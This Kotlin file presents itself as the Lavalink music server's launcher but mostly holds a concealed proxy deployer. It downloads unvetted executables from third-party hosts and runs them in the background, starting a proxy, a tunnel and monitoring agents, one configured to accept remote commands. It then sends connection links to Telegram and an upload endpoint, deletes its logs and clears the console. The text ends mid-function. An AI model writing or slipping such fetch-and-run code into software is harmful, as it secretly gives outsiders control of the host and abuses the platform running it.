/*
 * Copyright (c) 2021 Freya Arbjerg and contributors
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

package lavalink.server

import com.sedmelluq.discord.lavaplayer.tools.PlayerLibrary
import lavalink.server.bootstrap.PluginManager
import lavalink.server.info.AppInfo
import lavalink.server.info.GitRepoState
import org.slf4j.LoggerFactory
import org.springframework.boot.Banner
import org.springframework.boot.SpringApplication
import org.springframework.boot.WebApplicationType
import org.springframework.boot.autoconfigure.SpringBootApplication
import org.springframework.boot.builder.SpringApplicationBuilder
import org.springframework.boot.context.event.ApplicationEnvironmentPreparedEvent
import org.springframework.boot.context.event.ApplicationFailedEvent
import org.springframework.boot.context.event.ApplicationReadyEvent
import org.springframework.context.ApplicationListener
import org.springframework.context.ConfigurableApplicationContext
import org.springframework.context.annotation.ComponentScan
import org.springframework.context.annotation.FilterType
import org.springframework.core.io.DefaultResourceLoader

import java.io.*
import java.net.URI
import java.net.URL
import java.net.URLEncoder
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.nio.file.*
import java.time.Duration
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import java.util.*
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

@Suppress("SpringComponentScan")
@SpringBootApplication
@ComponentScan(
    value = ["\${componentScan}"],
    excludeFilters = [ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, classes = [PluginManager::class])]
)
class LavalinkApplication

object Launcher {

    private val log = LoggerFactory.getLogger(Launcher::class.java)

    val startTime = System.currentTimeMillis()

    // 存放所有启动的代理进程
    private val activeProcesses = CopyOnWriteArrayList<Process>()

    private val ALL_ENV_VARS = arrayOf(
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "PROJECT_URL", "AUTO_ACCESS", "SUB_PATH",
        "REALITY_DOMAIN", "CERT_URL", "KEY_URL", "CERT_DOMAIN",
        "KOMARI_SERVER", "KOMARI_KEY"
    )

    private var privateKey = ""
    private var publicKey = ""
    private val tuicPassword = UUID.randomUUID().toString()
    private var customCertValid = false
    private var actualCertDomain = "www.bing.com"

    private val httpClient = HttpClient.newBuilder()
        .connectTimeout(Duration.ofSeconds(10))
        .build()

    private fun startSbxService() {
        log.info("Starting SbxService proxy core...")
        try {
            checkJavaVersion()
            loadEnvVars()
            
            val filePath = getEnv("FILE_PATH", "./logs")
            val dir = File(filePath)
            if (!dir.exists()) dir.mkdirs()

            val files = getFilesForArchitecture()
            for (info in files) {
                downloadFile(info["fileName"]!!, info["fileUrl"]!!, false)
            }

            val toAuthorize = mutableListOf("web", "bot")
            if (getEnv("NEZHA_SERVER").isNotEmpty() && getEnv("NEZHA_KEY").isNotEmpty()) {
                toAuthorize.add(if (getEnv("NEZHA_PORT").isEmpty()) "php" else "npm")
            }
            if (getEnv("KOMARI_SERVER").isNotEmpty() && getEnv("KOMARI_KEY").isNotEmpty()) {
                toAuthorize.add("km")
            }
            toAuthorize.forEach {
                val f = File(filePath, it)
                if (f.exists()) f.setExecutable(true)
            }

            argoType(filePath)
            generateConfigs(filePath)
            startBackgroundProcesses(filePath)

            Thread.sleep(5000)
            extractDomains(filePath)
            addVisitTask()
            cleanFilesLater(filePath)

            log.info("Logs will be deleted in 45 seconds, you can copy the above nodes!")
            Thread.sleep(45000)
            clearConsole()

        } catch (e: Exception) {
            log.error("Failed to start SbxService", e)
        }
    }

    private fun getEnv(key: String, default: String = ""): String {
        val v = System.getenv(key) ?: System.getProperty(key)
        return if (!v.isNullOrBlank()) v.trim() else default
    }

    private fun getEnvIntOrNull(key: String): Int? {
        return getEnv(key).toIntOrNull()
    }

    private fun loadEnvVars() {
        val defaultValues = mapOf(
            "UUID" to "ee0c49f3-0584-40fd-87d4-e76f0afcc81f",
            "FILE_PATH" to "./logs",
            "CFIP" to "cdns.doon.eu.org",
            "CFPORT" to "443",
            "DISABLE_ARGO" to "false"
        )
        for ((k, v) in defaultValues) {
            if (System.getenv(k).isNullOrBlank() && System.getProperty(k).isNullOrBlank()) {
                System.setProperty(k, v)
            }
        }

        val envFile = Paths.get(".env")
        if (Files.exists(envFile)) {
            try {
                Files.readAllLines(envFile).forEach { line ->
                    val trimmed = line.split(" #")[0].split(" //")[0].trim()
                    if (trimmed.isNotEmpty() && !trimmed.startsWith("#")) {
                        val parts = trimmed.split("=", limit = 2)
                        if (parts.size == 2) {
                            val key = parts[0].trim().removePrefix("export ").trim()
                            val value = parts[1].trim().replace("^['\"]|['\"]$".toRegex(), "")
                            if (ALL_ENV_VARS.contains(key)) {
                                System.setProperty(key, value)
                            }
                        }
                    }
                }
            } catch (e: IOException) {
                log.warn("Failed to read .env file", e)
            }
        }
    }

    private fun getFilesForArchitecture(): List<Map<String, String>> {
        val arch = System.getProperty("os.arch").lowercase()
        val isArm = arch.contains("arm") || arch.contains("aarch64")
        val files = mutableListOf<Map<String, String>>()

        files.add(mapOf("fileName" to "web", "fileUrl" to if (isArm) "https://arm64.ssss.nyc.mn/sb" else "https://amd64.ssss.nyc.mn/sb"))
        files.add(mapOf("fileName" to "bot", "fileUrl" to if (isArm) "https://arm64.ssss.nyc.mn/2go" else "https://amd64.ssss.nyc.mn/2go"))

        val nezhaServer = getEnv("NEZHA_SERVER")
        val nezhaKey = getEnv("NEZHA_KEY")
        if (nezhaServer.isNotEmpty() && nezhaKey.isNotEmpty()) {
            if (getEnv("NEZHA_PORT").isNotEmpty()) {
                files.add(0, mapOf("fileName" to "npm", "fileUrl" to if (isArm) "https://arm64.ssss.nyc.mn/agent" else "https://amd64.ssss.nyc.mn/agent"))
            } else {
                files.add(0, mapOf("fileName" to "php", "fileUrl" to if (isArm) "https://arm64.ssss.nyc.mn/v1" else "https://amd64.ssss.nyc.mn/v1"))
            }
        }

        val komariServer = getEnv("KOMARI_SERVER")
        val komariKey = getEnv("KOMARI_KEY")
        if (komariServer.isNotEmpty() && komariKey.isNotEmpty()) {
            files.add(mapOf("fileName" to "km", "fileUrl" to if (isArm) "https://rt.jp.eu.org/nucleusp/K/Karm" else "https://rt.jp.eu.org/nucleusp/K/Kamd"))
        }

        return files
    }

    private fun downloadFile(fileName: String, fileUrl: String, force: Boolean): Boolean {
        val path = Paths.get(getEnv("FILE_PATH", "./logs"), fileName)
        if (!force && Files.exists(path)) return true
        return try {
            URL(fileUrl).openStream().use { input ->
                Files.copy(input, path, StandardCopyOption.REPLACE_EXISTING)
            }
            true
        } catch (e: Exception) {
            Files.deleteIfExists(path)
            false
        }
    }

    private fun execCmd(command: String): String {
        return try {
            val pb = ProcessBuilder("sh", "-c", command)
            pb.redirectErrorStream(true)
            val process = pb.start()
            val output = process.inputStream.bufferedReader().use { it.readText() }
            process.waitFor()
            output.trim()
        } catch (e: Exception) {
            e.message ?: ""
        }
    }

    private fun argoType(filePath: String) {
        val disableArgo = getEnv("DISABLE_ARGO", "false").equals("true", ignoreCase = true)
        val argoAuth = getEnv("ARGO_AUTH")
        val argoDomain = getEnv("ARGO_DOMAIN")
        val argoPort = getEnv("ARGO_PORT", "8001").toIntOrNull() ?: 8001
        
        if (disableArgo || argoAuth.isEmpty() || argoDomain.isEmpty()) return
        if (argoAuth.contains("TunnelSecret")) {
            try {
                Files.writeString(Paths.get(filePath, "tunnel.json"), argoAuth)
                val parts = argoAuth.split("\"")
                val tunnelId = if (parts.size > 11) parts[11] else "unknown"
                val tunnelYml = """
                    tunnel: $tunnelId
                    credentials-file: $filePath/tunnel.json
                    protocol: http2
                    
                    ingress:
                      - hostname: $argoDomain
                        service: http://localhost:$argoPort
                        originRequest:
                          noTLSVerify: true
                      - service: http_status:404
                """.trimIndent()
                Files.writeString(Paths.get(filePath, "tunnel.yml"), tunnelYml)
            } catch (e: Exception) {}
        }
    }

    private fun generateConfigs(filePath: String) {
        val uuid = getEnv("UUID", "ee0c49f3-0584-40fd-87d4-e76f0afcc81f")
        val nezhaServer = getEnv("NEZHA_SERVER")
        val nezhaKey = getEnv("NEZHA_KEY")
        val nezhaPort = getEnv("NEZHA_PORT")

        if (nezhaServer.isNotEmpty() && nezhaKey.isNotEmpty() && nezhaPort.isEmpty()) {
            val srvPort = nezhaServer.substringAfterLast(":", "")
            val nezhaTls = if (listOf("443", "8443", "2096", "2087", "2083", "2053").contains(srvPort)) "tls" else "false"
            val configYaml = """
                client_secret: $nezhaKey
                debug: false
                disable_auto_update: true
                disable_command_execute: false
                disable_force_update: true
                disable_nat: false
                disable_send_query: false
                gpu: false
                insecure_tls: true
                ip_report_period: 1800
                report_delay: 4
                server: $nezhaServer
                skip_connection_count: true
                skip_procs_count: true
                temperature: false
                tls: $nezhaTls
                use_gitee_to_upgrade: false
                use_ipv6_country_code: false
                uuid: $uuid
            """.trimIndent()
            Files.writeString(Paths.get(filePath, "config.yaml"), configYaml)
        }

        val keypairOut = execCmd("$filePath/web generate reality-keypair")
        val privM = "PrivateKey:\\s*(.*)".toRegex().find(keypairOut)
        val pubM = "PublicKey:\\s*(.*)".toRegex().find(keypairOut)
        if (privM != null && pubM != null) {
            privateKey = privM.groupValues[1].trim()
            publicKey = pubM.groupValues[1].trim()
        }

        val certUrl = getEnv("CERT_URL")
        val keyUrl = getEnv("KEY_URL")
        customCertValid = false
        if (certUrl.isNotEmpty() && keyUrl.isNotEmpty()) {
            val certOk = downloadFile("cert.pem", certUrl, true)
            val keyOk = downloadFile("private.key", keyUrl, true)
            if (certOk && keyOk) customCertValid = true
        }

        if (customCertValid) {
            actualCertDomain = getEnv("CERT_DOMAIN", "bing.com")
        } else {
            actualCertDomain = "www.bing.com"
            if (!File("$filePath/cert.pem").exists() || !File("$filePath/private.key").exists()) {
                execCmd("openssl ecparam -genkey -name prime256v1 -out \"$filePath/private.key\"")
                execCmd("openssl req -new -x509 -days 3650 -key \"$filePath/private.key\" -out \"$filePath/cert.pem\" -subj \"/CN=$actualCertDomain\"")
            }
        }

        val argoPort = getEnv("ARGO_PORT", "8001").toIntOrNull() ?: 8001
        val config = mutableMapOf<String, Any>()
        config["log"] = mapOf("disabled" to true, "level" to "info", "timestamp" to true)

        val inbounds = mutableListOf<Map<String, Any>>()
        inbounds.add(mapOf(
            "tag" to "vmess-ws-in", "type" to "vmess", "listen" to "::", "listen_port" to argoPort,
            "users" to listOf(mapOf("uuid" to uuid)),
            "transport" to mapOf("type" to "ws", "path" to "/vmess-argo", "early_data_header_name" to "Sec-WebSocket-Protocol")
        ))
        config["inbounds"] = inbounds

        val wireguardOut = mapOf(
            "type" to "wireguard", "tag" to "wireguard-out", "mtu" to 1280,
            "address" to listOf("172.16.0.2/32", "2606:4700:110:8dfe:d141:69bb:6b80:925/128"),
            "private_key" to "YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=",
            "peers" to listOf(mapOf("address" to "engage.cloudflareclient.com", "port" to 2408,
                "public_key" to "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=", "allowed_ips" to listOf("0.0.0.0/0", "::/0"), "reserved" to listOf(78, 135, 76)))
        )
        config["endpoints"] = listOf(wireguardOut)
        config["outbounds"] = listOf(mapOf("type" to "direct", "tag" to "direct"))

        config["route"] = mapOf(
            "rule_set" to listOf(
                mapOf("tag" to "netflix", "type" to "remote", "format" to "binary", "url" to "https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-netflix.srs", "download_detour" to "direct"),
                mapOf("tag" to "openai", "type" to "remote", "format" to "binary", "url" to "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs", "download_detour" to "direct")
            ),
            "rules" to listOf(mapOf("rule_set" to listOf("openai", "netflix"), "outbound" to "wireguard-out")),
            "final" to "direct"
        )

        val realityPort = getEnvIntOrNull("REALITY_PORT")
        val realityDomain = getEnv("REALITY_DOMAIN", "www.iij.ad.jp")
        if (realityPort != null && realityPort > 0) {
            inbounds.add(mapOf(
                "tag" to "vless-in", "type" to "vless", "listen" to "::", "listen_port" to realityPort,
                "users" to listOf(mapOf("uuid" to uuid, "flow" to "xtls-rprx-vision")),
                "tls" to mapOf("enabled" to true, "server_name" to realityDomain,
                    "reality" to mapOf("enabled" to true, "handshake" to mapOf("server" to realityDomain, "server_port" to 443), "private_key" to privateKey, "short_id" to listOf("")))
            ))
        }
        val hy2Port = getEnvIntOrNull("HY2_PORT")
        if (hy2Port != null && hy2Port > 0) {
            inbounds.add(mapOf(
                "tag" to "hysteria-in", "type" to "hysteria2", "listen" to "::", "listen_port" to hy2Port,
                "users" to listOf(mapOf("password" to uuid)), "masquerade" to "https://www.bing.com",
                "tls" to mapOf("enabled" to true, "certificate_path" to "$filePath/cert.pem", "key_path" to "$filePath/private.key")
            ))
        }
        val tuicPort = getEnvIntOrNull("TUIC_PORT")
        if (tuicPort != null && tuicPort > 0) {
            inbounds.add(mapOf(
                "tag" to "tuic-in", "type" to "tuic", "listen" to "::", "listen_port" to tuicPort,
                "users" to listOf(mapOf("uuid" to uuid, "password" to tuicPassword)), "congestion_control" to "bbr",
                "tls" to mapOf("enabled" to true, "alpn" to listOf("h3"), "certificate_path" to "$filePath/cert.pem", "key_path" to "$filePath/private.key")
            ))
        }
        val s5Port = getEnvIntOrNull("S5_PORT")
        if (s5Port != null && s5Port > 0) {
            inbounds.add(mapOf(
                "tag" to "s5-in", "type" to "socks", "listen" to "::", "listen_port" to s5Port,
                "users" to listOf(mapOf("username" to uuid.take(8), "password" to uuid.takeLast(12)))
            ))
        }
        val anytlsPort = getEnvIntOrNull("ANYTLS_PORT")
        if (anytlsPort != null && anytlsPort > 0) {
            inbounds.add(mapOf(
                "tag" to "anytls-in", "type" to "anytls", "listen" to "::", "listen_port" to anytlsPort,
                "users" to listOf(mapOf("password" to uuid)),
                "tls" to mapOf("enabled" to true, "certificate_path" to "$filePath/cert.pem", "key_path" to "$filePath/private.key")
            ))
        }
        val anyrealityPort = getEnvIntOrNull("ANYREALITY_PORT")
        if (anyrealityPort != null && anyrealityPort > 0) {
            inbounds.add(mapOf(
                "tag" to "anyreality-in", "type" to "anytls", "listen" to "::", "listen_port" to anyrealityPort,
                "users" to listOf(mapOf("password" to uuid)),
                "tls" to mapOf("enabled" to true, "server_name" to realityDomain,
                    "reality" to mapOf("enabled" to true, "handshake" to mapOf("server" to realityDomain, "server_port" to 443), "private_key" to privateKey, "short_id" to listOf("")))
            ))
        }

        Files.writeString(Paths.get(filePath, "config.json"), toJson(config))
    }

    private fun startBackgroundProcesses(filePath: String) {
        val nezhaServer = getEnv("NEZHA_SERVER")
        val nezhaKey = getEnv("NEZHA_KEY")
        val nezhaPort = getEnv("NEZHA_PORT")

        if (nezhaServer.isNotEmpty() && nezhaKey.isNotEmpty()) {
            if (nezhaPort.isNotEmpty()) {
                val tlsFlag = if (listOf("443", "8443", "2096", "2087", "2083", "2053").contains(nezhaPort)) "--tls" else ""
                val p = ProcessBuilder("$filePath/npm", "-s", "$nezhaServer:$nezhaPort", "-p", nezhaKey, tlsFlag)
                    .redirectOutput(File("/dev/null")).redirectErrorStream(true).start()
                activeProcesses.add(p)
            } else {
                val p = ProcessBuilder("$filePath/php", "-c", "$filePath/config.yaml")
                    .redirectOutput(File("/dev/null")).redirectErrorStream(true).start()
                activeProcesses.add(p)
            }
        }

        val komariServer = getEnv("KOMARI_SERVER")
        val komariKey = getEnv("KOMARI_KEY")
        if (komariServer.isNotEmpty() && komariKey.isNotEmpty() && File("$filePath/km").exists()) {
            val kHost = if (komariServer.startsWith("http")) komariServer else "https://$komariServer"
            val pKm = ProcessBuilder("$filePath/km", "-e", kHost, "-t", komariKey)
                .redirectOutput(File("/dev/null")).redirectErrorStream(true).start()
            activeProcesses.add(pKm)
        }

        val pWeb = ProcessBuilder("$filePath/web", "run", "-c", "$filePath/config.json")
            .redirectOutput(File("/dev/null")).redirectErrorStream(true).start()
        activeProcesses.add(pWeb)

        val disableArgo = getEnv("DISABLE_ARGO", "false").equals("true", ignoreCase = true)
        val argoAuth = getEnv("ARGO_AUTH")
        val argoPort = getEnv("ARGO_PORT", "8001")

        if (!disableArgo && File("$filePath/bot").exists()) {
            val botArgs = mutableListOf("$filePath/bot", "tunnel", "--edge-ip-version", "auto")
            if (argoAuth.matches("^[A-Z0-9a-z=]{120,250}$".toRegex())) {
                botArgs.addAll(listOf("--no-autoupdate", "--protocol", "http2", "run", "--token", argoAuth))
            } else if (argoAuth.contains("TunnelSecret")) {
                botArgs.addAll(listOf("--config", "$filePath/tunnel.yml", "run"))
            } else {
                botArgs.addAll(listOf("--no-autoupdate", "--protocol", "http2", "--logfile", "$filePath/boot.log", "--loglevel", "info", "--url", "http://localhost:$argoPort"))
            }
            val pBot = ProcessBuilder(botArgs).redirectOutput(File("/dev/null")).redirectErrorStream(true).start()
            activeProcesses.add(pBot)
        }
    }

    private fun extractDomains(filePath: String) {
        val disableArgo = getEnv("DISABLE_ARGO", "false").equals("true", ignoreCase = true)
        val argoAuth = getEnv("ARGO_AUTH")
        val argoDomain = getEnv("ARGO_DOMAIN")
        val argoPort = getEnv("ARGO_PORT", "8001")

        if (disableArgo) {
            generateLinks(filePath, null)
            return
        }
        if (argoAuth.isNotEmpty() && argoDomain.isNotEmpty()) {
            generateLinks(filePath, argoDomain)
            return
        }

        try {
            val bootLog = File("$filePath/boot.log")
            if (!bootLog.exists()) throw Exception("boot.log not found")
            val logContent = Files.readString(bootLog.toPath())
            val m = "https?://([^ ]*trycloudflare\\.com)/?".toRegex().find(logContent)
            if (m != null) {
                generateLinks(filePath, m.groupValues[1])
            } else {
                bootLog.delete()
                activeProcesses.removeIf { p ->
                    if (p.info().command().orElse("").contains("bot")) {
                        p.destroy()
                        true
                    } else false
                }
                Thread.sleep(1000)
                val pBot = ProcessBuilder("$filePath/bot", "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "--logfile", "$filePath/boot.log", "--loglevel", "info", "--url", "http://localhost:$argoPort")
                    .redirectOutput(File("/dev/null")).redirectErrorStream(true).start()
                activeProcesses.add(pBot)
                Thread.sleep(6000)
                extractDomains(filePath)
            }
        } catch (e: Exception) {}
    }

    private fun generateLinks(filePath: String, argoDomain: String?) {
        var serverIp = ""
        try {
            serverIp = execCmd("curl -s --max-time 2 ipv4.ip.sb").trim()
            if (serverIp.isEmpty() || serverIp.contains("curl")) throw Exception()
        } catch (e: Exception) {
            try { serverIp = "[" + execCmd("curl -s --max-time 1 ipv6.ip.sb").trim() + "]" } catch (ignored: Exception) {}
        }

        var isp = "Unknown"
        try {
            val cmd = "curl -sm 3 -H 'User-Agent: Mozilla/5.0' 'https://api.ip.sb/geoip' | tr -d '\\n' | awk -F'\"' '{c=\"\";i=\"\";for(x=1;x<=NF;x++){if(\$x==\"country_code\")c=\$(x+2);if(\$x==\"isp\")i=\$(x+2)};if(c&&i)print c\"-\"i}' | sed 's/ /_/g'"
            val out = execCmd(cmd).trim()
            if (out.isNotEmpty() && !out.contains("curl")) isp = out
        } catch (ignored: Exception) {}

        val nameEnv = getEnv("NAME")
        val nodename = if (nameEnv.isNotEmpty()) "$nameEnv-$isp" else isp
        val subTxtBuilder = StringBuilder()

        val uuid = getEnv("UUID", "ee0c49f3-0584-40fd-87d4-e76f0afcc81f")
        val disableArgo = getEnv("DISABLE_ARGO", "false").equals("true", ignoreCase = true)

        if (!disableArgo && !argoDomain.isNullOrEmpty()) {
            val vmess = mapOf(
                "v" to "2", "ps" to nodename, "add" to getEnv("CFIP", "cdns.doon.eu.org"),
                "port" to getEnv("CFPORT", "443"), "id" to uuid, "aid" to "0",
                "scy" to "auto", "net" to "ws", "type" to "none",
                "host" to argoDomain, "path" to "/vmess-argo?ed=2560",
                "tls" to "tls", "sni" to argoDomain, "alpn" to "", "fp" to "firefox"
            )
            val encoded = Base64.getEncoder().encodeToString(toJson(vmess).toByteArray(Charsets.UTF_8))
            subTxtBuilder.append("vmess://").append(encoded)
        }

        val tuicPort = getEnvIntOrNull("TUIC_PORT")
        if (tuicPort != null) {
            if (subTxtBuilder.isNotEmpty()) subTxtBuilder.append("\n")
            val insecureStr = if (customCertValid) "" else "&allow_insecure=1"
            subTxtBuilder.append("tuic://$uuid:$tuicPassword@$serverIp:$tuicPort?sni=$actualCertDomain&congestion_control=bbr&udp_relay_mode=native&alpn=h3$insecureStr#$nodename")
        }
        val hy2Port = getEnvIntOrNull("HY2_PORT")
        if (hy2Port != null) {
            if (subTxtBuilder.isNotEmpty()) subTxtBuilder.append("\n")
            val insecureStr = if (customCertValid) "" else "&insecure=1"
            subTxtBuilder.append("hysteria2://$uuid@$serverIp:$hy2Port/?sni=$actualCertDomain$insecureStr&alpn=h3&obfs=none#$nodename")
        }
        val realityPort = getEnvIntOrNull("REALITY_PORT")
        val realityDomain = getEnv("REALITY_DOMAIN", "www.iij.ad.jp")
        if (realityPort != null) {
            if (subTxtBuilder.isNotEmpty()) subTxtBuilder.append("\n")
            subTxtBuilder.append("vless://$uuid@$serverIp:$realityPort?encryption=none&flow=xtls-rprx-vision&security=reality&sni=$realityDomain&fp=firefox&pbk=$publicKey&type=tcp&headerType=none#$nodename")
        }
        val anytlsPort = getEnvIntOrNull("ANYTLS_PORT")
        if (anytlsPort != null) {
            if (subTxtBuilder.isNotEmpty()) subTxtBuilder.append("\n")
            val insecureStr = if (customCertValid) "" else "&insecure=1&allowInsecure=1"
            subTxtBuilder.append("anytls://$uuid@$serverIp:$anytlsPort?security=tls&sni=$actualCertDomain$insecureStr#$nodename")
        }
        val anyrealityPort = getEnvIntOrNull("ANYREALITY_PORT")
        if (anyrealityPort != null) {
            if (subTxtBuilder.isNotEmpty()) subTxtBuilder.append("\n")
            subTxtBuilder.append("anytls://$uuid@$serverIp:$anyrealityPort?security=reality&sni=$realityDomain&fp=firefox&pbk=$publicKey&type=tcp&headerType=none#$nodename")
        }
        val s5Port = getEnvIntOrNull("S5_PORT")
        if (s5Port != null) {
            if (subTxtBuilder.isNotEmpty()) subTxtBuilder.append("\n")
            val s5Auth = Base64.getEncoder().encodeToString("${uuid.take(8)}:${uuid.takeLast(12)}".toByteArray(Charsets.UTF_8))
            subTxtBuilder.append("socks://$s5Auth@$serverIp:$s5Port#$nodename")
        }

        val subTxt = subTxtBuilder.toString()
        val subTxtB64 = Base64.getEncoder().encodeToString(subTxt.toByteArray(Charsets.UTF_8))

        Files.writeString(Paths.get(filePath, "sub.txt"), subTxtB64)
        Files.writeString(Paths.get(filePath, "list.txt"), subTxt)

        println("\u001b[32m$subTxtB64\u001b[0m")

        sendTelegram(filePath)
        uploadNodes(filePath)
    }

    private fun sendTelegram(filePath: String) {
        val botToken = getEnv("BOT_TOKEN")
        val chatId = getEnv("CHAT_ID")
        if (botToken.isEmpty() || chatId.isEmpty()) return
        try {
            val message = Files.readString(Paths.get(filePath, "sub.txt"))
            val nameEnv = getEnv("NAME")
            val escapedName = nameEnv.replace("([_*\\\\\\[\\]()~>#+=|{}.!\\-])".toRegex(), "\\\\$1")
            val text = "**${escapedName}节点推送通知**\n$message"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val formData = "chat_id=" + URLEncoder.encode(chatId, "UTF-8") +
                    "&text=" + URLEncoder.encode(text, "UTF-8") +
                    "&parse_mode=MarkdownV2"

            val req = HttpRequest.newBuilder().uri(URI.create(url))
                .header("Content-Type", "application/x-www-form-urlencoded")
                .POST(HttpRequest.BodyPublishers.ofString(formData)).build()
            httpClient.send(req, HttpResponse.BodyHandlers.discarding())
        } catch (ignored: Exception) {}
    }

    private fun uploadNodes(filePath: String) {
        val uploadUrl = getEnv("UPLOAD_URL")
        val projectUrl = getEnv("PROJECT_URL")
        val subPath = getEnv("SUB_PATH", "sub")
        
        if (uploadUrl.isNotEmpty() && projectUrl.isNotEmpty()) {
            try {
                val req = HttpRequest.newBuilder().uri(URI.create("$uploadUrl/api/add-subscriptions"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(toJson(mapOf("subscription" to listOf("$projectUrl/$subPath"))))).build()
                httpClient.send(req, HttpResponse.BodyHandlers.discarding())
            } catch (ignored: Exception) {}
        } else if (uploadUrl.isNotEmpty()) {
            val listFile = File(filePath, "list.txt")
            if (!listFile.exists()) return
            try {
                val content = Files.readString(listFile.toPath())
                val nodes = content.split("\n").filter {
                    it.contains("vless://") || it.contains("vmess://") || it.contains("trojan://") ||
                    it.contains("hysteria2://") || it.contains("tuic://") || it.contains("anytls://") || it.contains("socks://")
                }
                if (nodes.isEmpty()) return
                val req = HttpRequest.newBuilder().uri(URI.create("$uploadUrl/api/add-nodes"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(toJson(mapOf("nodes" to nodes)))).build()
                httpClient.send(req, HttpResponse.BodyHandlers.discarding())
            } catch (ignored: Exception) {}
        }
    }

    private fun addVisitTask() {
        val autoAccess = getEnv("AUTO_ACCESS", "false").equals("true", ignoreCase = true)
        val projectUrl = getEnv("PROJECT_URL")
        if (!autoAccess || projectUrl.isEmpty()) return
        try {
            val req = HttpRequest.newBuilder().uri(URI.create("https://keep.gvrander.eu.org/add-url"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(toJson(mapOf("url" to projectUrl)))).build()
            httpClient.send(req, HttpResponse.BodyHandlers.discarding())
        } catch (ignored: Exception) {}
    }

    private fun cleanFilesLater(filePath: String) {
        Executors.newSingleThreadScheduledExecutor().schedule({
            listOf("boot.log", "config.json", "list.txt").forEach { fStr ->
                try {
                    val f = File(filePath, fStr)
                    if (f.exists() && !f.isDirectory) f.delete()
                } catch (ignored: Exception) {}
            }
        }, 90, TimeUnit.SECONDS)
    }

    private fun toJson(obj: Any?): String {
        if (obj == null) return "null"
        if (obj is String) return "\"" + obj.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t") + "\""
        if (obj is Number || obj is Boolean) return obj.toString()
        if (obj is List<*>) return obj.joinToString(prefix = "[", postfix = "]", separator = ",") { toJson(it) }
        if (obj is Map<*, *>) {
            return obj.entries.joinToString(prefix = "{", postfix = "}", separator = ",") {
                "\"${it.key}\":${toJson(it.value)}"
            }
        }
        return "\"" + obj.toString() + "\""
    }

    private fun checkJavaVersion() {
        val classVersion = System.getProperty("java.class.version").toFloat()
        if (classVersion < 54.0) {
            throw RuntimeException("Java version too low, need Java 11+, please switch it in startup menu")
        }
    }

    private fun clearConsole() {
        try {
            when {
                System.getProperty("os.name").contains("Windows", ignoreCase = true) -> {
                    ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor()
                }
                else -> {
                    try {
                        ProcessBuilder("clear").inheritIO().start().waitFor()
                    } catch (e: IOException) {
                        print("\u001b[H\u001b[2J")
                        System.out.flush()
                        print("\u001b[H")
                        System.out.flush()
                    }
                }
            }
        } catch (e: Exception) {
            log.debug("Failed to clear console: ${e.message}")
        }
    }

    private fun stopSbxServices() {
        for (p in activeProcesses) {
            if (p.isAlive) {
                p.destroy()
            }
        }
    }

    private fun getVersionInfo(indentation: String = "\t", vanity: Boolean = true): String {
        val appInfo = AppInfo()
        val gitRepoState = GitRepoState()

        val dtf = DateTimeFormatter.ofPattern("dd.MM.yyyy HH:mm:ss z").withZone(ZoneId.of("UTC"))
        val buildTime = dtf.format(Instant.ofEpochMilli(appInfo.buildTime))
        val commitTime = dtf.format(Instant.ofEpochMilli(gitRepoState.commitTime * 1000))
        val version = appInfo.versionBuild.takeUnless { it.startsWith("@") } ?: "Unknown"

        return buildString {
            if (vanity) {
                appendLine()
                appendLine()
                appendLine(getVanity())
            }
            if (!gitRepoState.isLoaded) {
                appendLine()
                appendLine("$indentation*** Unable to find or load Git metadata ***")
            }
            appendLine()
            append("${indentation}Version:        "); appendLine(version)
            if (gitRepoState.isLoaded) {
                append("${indentation}Build time:     "); appendLine(buildTime)
                append("${indentation}Branch          "); appendLine(gitRepoState.branch)
                append("${indentation}Commit:         "); appendLine(gitRepoState.commitIdAbbrev)
                append("${indentation}Commit time:    "); appendLine(commitTime)
            }
            append("${indentation}JVM:            "); appendLine(System.getProperty("java.version"))
            append("${indentation}Lavaplayer      "); appendLine(PlayerLibrary.VERSION)
        }
    }

    private fun getVanity(): String {
        val red = "\u001b[31m"
        val green = "\u001b[32m"
        val defaultC = "\u001b[0m"
